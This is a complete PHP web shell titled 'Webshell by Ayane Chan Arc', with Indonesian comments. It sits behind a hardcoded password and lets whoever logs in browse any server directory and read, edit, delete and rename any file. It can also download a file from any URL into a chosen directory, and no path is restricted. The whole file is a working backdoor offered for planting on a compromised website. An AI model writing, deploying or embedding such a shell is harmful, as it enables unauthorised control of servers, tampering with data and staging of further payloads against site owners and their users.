<?php
session_start();

// Fitur Password
$password = 'ayane111'; // Ganti dengan password yang diinginkan
$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        $isAuthenticated = true;
    } else {
        echo "<div class='alert alert-danger'>Incorrect password.</div>";
    }
}

// Fungsi untuk mengunduh file dari URL dan menyimpannya ke direktori yang dipilih
function uploadFromUrl($url, $saveTo) {
    $fileContent = file_get_contents($url);
    if ($fileContent === FALSE) {
        die('Failed to download file from URL');
    }
    file_put_contents($saveTo, $fileContent);
    echo "<div class='alert alert-success'>File uploaded successfully: $saveTo</div>";
}

// Fungsi untuk menampilkan link ke folder dan file dalam direktori
function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        // Menampilkan folder
        foreach ($folders as $folder) {
            $folderPath = htmlspecialchars($dir . '/' . $folder);
            echo "<a href='?dir=" . urlencode($folderPath) . "' class='list-group-item list-group-item-action'>$folder/</a>";
        }

        // Menampilkan file
        foreach ($files as $file) {
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<span>$file</span>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='edit' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='submit' class='btn btn-primary btn-sm ml-2'>Edit</button>";
            echo "</form>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='delete' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='submit' class='btn btn-danger btn-sm ml-2'>Delete</button>";
            echo "</form>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='rename' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' onclick=\"document.getElementById('rename-form').style.display='block'\">Rename</button>";
            echo "</form>";
            echo "</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Directory not found.</div>";
    }
}

// Fungsi untuk mengedit file
function editFile($filePath, $newContent) {
    if (file_put_contents($filePath, $newContent) !== false) {
        echo "<div class='alert alert-success'>File edited successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to edit file.</div>";
    }
}

// Fungsi untuk menghapus file
function deleteFile($filePath) {
    if (unlink($filePath)) {
        echo "<div class='alert alert-success'>File deleted successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to delete file.</div>";
    }
}

// Fungsi untuk mengubah nama file
function renameFile($oldPath, $newPath) {
    if (rename($oldPath, $newPath)) {
        echo "<div class='alert alert-success'>File renamed successfully.</div>";
    } else {
        echo "<div class='alert alert-danger'>Failed to rename file.</div>";
    }
}

// Menangani upload file dari URL
if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url); // Ambil nama file dari URL
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

// Menangani pengeditan file
if (isset($_POST['edit']) && isset($_POST['content'])) {
    $file = $_POST['edit'];
    $content = $_POST['content'];
    editFile($file, $content);
}

// Menangani penghapusan file
if (isset($_POST['delete'])) {
    $file = $_POST['delete'];
    deleteFile($file);
}

// Menangani perubahan nama file
if (isset($_POST['rename']) && isset($_POST['newName'])) {
    $oldPath = $_POST['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . '/' . $newName;
    renameFile($oldPath, $newPath);
}

// Menentukan direktori saat ini atau yang dipilih
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$displayDir = realpath($dir); // Mendapatkan path direktori yang absolut

// Membuat path direktori sebagai array
$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell by Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #e3f2fd; /* Biru muda */
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .btn-primary {
            background-color: #e91e63; /* Pink */
            border-color: #e91e63;
        }
        .btn-primary:hover {
            background-color: #c2185b; /* Pink gelap */
            border-color: #c2185b;
        }
        .btn-danger {
            background-color: #f44336;
            border-color: #f44336;
        }
        .btn-danger:hover {
            background-color: #c62828;
            border-color: #c62828;
        }
        .alert-success {
            background-color: #4caf50;
            color: #ffffff;
        }
        .alert-danger {
            background-color: #f44336;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <?php if (!$isAuthenticated): ?>
            <form method="post">
                <div class="form-group">
                    <label for="password">Enter Password</label>
                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        <?php else: ?>
            <h1 class="mb-4">Webshell by Ayane Chan Arc</h1>

            <!-- Navigasi Direktori -->
            <div class="mb-4">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="?dir=">/</a></li>
                        <?php foreach ($dirArray as $key => $dirPart): ?>
                            <?php $path = implode(DIRECTORY_SEPARATOR, array_slice($dirArray, 0, $key + 1)); ?>
                            <li class="breadcrumb-item">
                                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($dirPart); ?></a>
                            </li>
                        <?php endforeach; ?>
                    </ol>
                </nav>
            </div>

            <!-- Daftar Folder dan File -->
            <div class="list-group">
                <?php display_path_links($dir); ?>
            </div>

            <!-- Form untuk upload file dari URL -->
            <div class="mt-4">
                <h2>Upload File from URL</h2>
                <form method="post">
                    <div class="form-group">
                        <label for="url">File URL</label>
                                                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
                    </div>
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($displayDir); ?>">
                    <button type="submit" class="btn btn-primary">Upload</button>
                </form>
            </div>

            <!-- Form untuk edit file -->
            <?php if (isset($_POST['edit'])): ?>
                <div class="mt-4">
                    <h2>Edit File</h2>
                    <form method="post">
                        <div class="form-group">
                            <label for="content">File Content</label>
                            <textarea id="content" name="content" class="form-control" rows="10" required><?php echo htmlspecialchars(file_get_contents($_POST['edit'])); ?></textarea>
                        </div>
                        <input type="hidden" name="edit" value="<?php echo htmlspecialchars($_POST['edit']); ?>">
                        <button type="submit" class="btn btn-primary">Save Changes</button>
                    </form>
                </div>
            <?php endif; ?>

            <!-- Form untuk rename file -->
            <div id="rename-form" class="mt-4" style="display:none;">
                <h2>Rename File</h2>
                <form method="post">
                    <div class="form-group">
                        <label for="newName">New File Name</label>
                        <input type="text" id="newName" name="newName" class="form-control" placeholder="Enter new file name" required>
                    </div>
                    <input type="hidden" name="rename" value="<?php echo htmlspecialchars($_POST['rename']); ?>">
                    <button type="submit" class="btn btn-primary">Rename</button>
                </form>
            </div>

            <!-- Form untuk mengedit atau menghapus file -->
            <div class="mt-4">
                <h2>File Actions</h2>
                <!-- Form untuk delete file -->
                <form method="post" style="display:inline;">
                    <input type="hidden" name="delete" value="<?php echo htmlspecialchars($file); ?>">
                    <button type="submit" class="btn btn-danger">Delete File</button>
                </form>
            </div>
        <?php endif; ?>
    </div>

    <!-- Bootstrap JS dan dependencies -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>

